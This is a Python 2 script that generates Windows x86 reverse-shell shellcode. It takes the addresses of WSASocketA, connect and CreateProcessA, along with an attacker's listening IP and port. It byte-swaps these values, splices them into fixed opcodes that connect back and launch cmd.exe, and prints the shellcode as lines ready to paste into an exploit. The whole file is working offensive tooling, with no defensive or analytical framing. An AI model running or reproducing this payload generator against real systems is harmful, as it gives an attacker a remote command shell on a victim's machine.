#!/usr/bin/python

import argparse

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument("-a", "--arwin", help="Get command line syntax for arwin for each address",
                    action="store_true")
args = parser.parse_args()


def default():
	
	WSASocketA = raw_input('Enter WSASocketA address (example - 7718E562): ')
	lhost = raw_input('Enter LHOST IP (example - 192.168.1.211): ')
	while True:
		lport = int(raw_input('Enter LPORT (example - 443): '))
		if lport > 9999 or lport < 257:
			print '[!] LPORT must be between 257 and 9999!'
		else:
			break
	connect = raw_input('Enter connect address (example - 7718E562): ')
	CreateProcessA = raw_input('Enter CreateProcessA address (example - 7718E562): ')
	varName = raw_input('Enter variable name for shellcode: ')

	#preparing WSASocketA
	socketchunk1 = WSASocketA[0:2]
	socketchunk2 = WSASocketA[2:4] + '\\x'
	socketchunk3 = WSASocketA[4:6] + '\\x'
	socketchunk4 = '\\x' + WSASocketA[6:] + '\\x'

	WSASocketA = socketchunk4 + socketchunk3 + socketchunk2 + socketchunk1
	WSASocketA = WSASocketA.lower()

	#preparing lhost
	tempIP = lhost.split('.')
	lhost = ""
	for x in tempIP:
		temp2 = int(x)
		temp3 = '{:02X}'.format(temp2)
		lhost += '\\x' + temp3
	
	lhost = lhost.lower()
	
	#preparing lport
	lport = str(hex(lport)).replace('0x', '')

	if len(lport) == 3:
		lport = "\\x0" + lport[0:1] + '\\x' + lport[1:]
	
	else:
		lport = "\\x" + lport[0:2] + '\\x' + lport[2:]
	
	#preparing connect
	connectchunk1 = connect[0:2]
	connectchunk2 = connect[2:4] + '\\x'
	connectchunk3 = connect[4:6] + '\\x'
	connectchunk4 = '\\x' + connect[6:] + '\\x'
	
	connect = connectchunk4 + connectchunk3 + connectchunk2 + connectchunk1
	connect = connect.lower()
	
	#preparing CreateProcessA
	processchunk1 = CreateProcessA[0:2]
	processchunk2 = CreateProcessA[2:4] + '\\x'
	processchunk3 = CreateProcessA[4:6] + '\\x'
	processchunk4 = '\\x' + CreateProcessA[6:] + '\\x'
	
	CreateProcessA = processchunk4 + processchunk3 + processchunk2 + processchunk1
	CreateProcessA = CreateProcessA.lower()
	
	revshell  = "\\x31\\xc0\\x50\\x50\\x50\\x31\\xdb\\xb3\\x06\\x53\\x40\\x50\\x40\\x50\\xbb"
	revshell += WSASocketA 
	revshell += "\\x31\\xc0\\xff\\xd3\\x96\\x68"
	revshell += lhost
	revshell += "\\x66\\x68"
	revshell += lport
	revshell += "\\x31\\xdb\\x80\\xc3\\x02\\x66\\x53\\x89\\xe2\\x6a\\x10\\x52\\x56\\xbb"
	revshell += connect
	revshell += "\\xff\\xd3\\xba\\x63\\x63\\x6d\\x64\\xc1\\xea\\x08\\x52\\x89\\xe1\\x31\\xd2\\x83\\xec\\x10\\x89\\xe3\\x56\\x56\\x56\\x52" 
	revshell += "\\x52\\x31\\xc0\\x40\\xc1\\xc0\\x08\\x50\\x52\\x52\\x52\\x52\\x52\\x52\\x52\\x52\\x52\\x52\\x31\\xc0\\x04\\x2c\\x50\\x89\\xe0\\x53"
	revshell += "\\x50\\x52\\x52\\x52\\x31\\xc0\\x40\\x50\\x52\\x52\\x51\\x52\\xbb"
	revshell += CreateProcessA
	revshell += "\\xff\\xd3"

	print '\n'
	
	print varName + '  = \"' + revshell[:64] + '\"'
	print varName + ' += \"' + revshell[64:128] + '\"'
	print varName + ' += \"' + revshell[128:192] + '\"'
	print varName + ' += \"' + revshell[192:256] + '\"'
	print varName + ' += \"' + revshell[256:320] + '\"'
	print varName + ' += \"' + revshell[320:384] + '\"'
	print varName + ' += \"' + revshell[384:448] + '\"'
	print varName + ' += \"' + revshell[448:] + '\"'
	
	print '\n'
	
	print 'STACK ALIGNMENT NOT INCLUDED! ;)'
	
def help():
	print 'To Retrieve WSASocketA Address: arwin.exe ws2_32 WSASocketA'
	print 'To Retrieve connect Address: arwin.exe ws2_32 connect'
	print 'To Retrieve CreateProcessA Address: arwin.exe kernel32 CreateProcessA'

if args.arwin:
	help()
else:
	default()
